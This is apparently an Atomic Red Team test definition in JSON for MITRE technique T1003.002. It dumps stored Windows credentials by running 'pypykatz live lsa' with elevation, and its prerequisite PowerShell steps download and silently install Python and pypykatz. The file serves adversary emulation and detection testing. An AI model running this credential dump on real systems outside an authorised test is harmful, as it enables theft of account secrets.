{
    "name": "Registry parse with pypykatz",
    "description": "Parses registry hives to obtain stored credentials.  Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution. ",
    "supported_platforms": [
        "windows"
    ],
    "dependency_executor_name": "powershell",
    "executor": {
        "command": "\"#{venv_path}\\Scripts\\pypykatz\" live lsa \n",
        "name": "command_prompt",
        "elevation_required": true,
        "type": "Command Executor"
    },
    "id": "T1003.002",
    "tactics": [
        "Credential Access"
    ],
    "technique": "Security Account Manager",
    "source": "ART",
    "uuid": "a96872b2-cbf3-46cf-8eb4-27e8c0e85263",
    "arguments": {
        "venv_path": {
            "description": "Path to the folder for the tactics venv",
            "type": "string",
            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_002"
        }
    },
    "preconditions": [
        {
            "description": "Computer must have python 3 installed\n",
            "prereq_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
        },
        {
            "description": "Computer must have venv configured at #{venv_path}\n",
            "prereq_command": "if (Test-Path -Path \"#{venv_path}\") { exit 0 } else { exit 1 }\n",
            "get_prereq_command": "py -m venv \"#{venv_path}\"\n"
        },
        {
            "description": "pypykatz must be installed \n",
            "prereq_command": "if (Get-Command \"#{venv_path}\\Scripts\\pypykatz\" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
            "get_prereq_command": "& \"#{venv_path}\\Scripts\\pip.exe\" install --no-cache-dir pypykatz 2>&1 | Out-Null\n"
        }
    ],
    "infrastructure_requirement": [],
    "side": "Victim"
}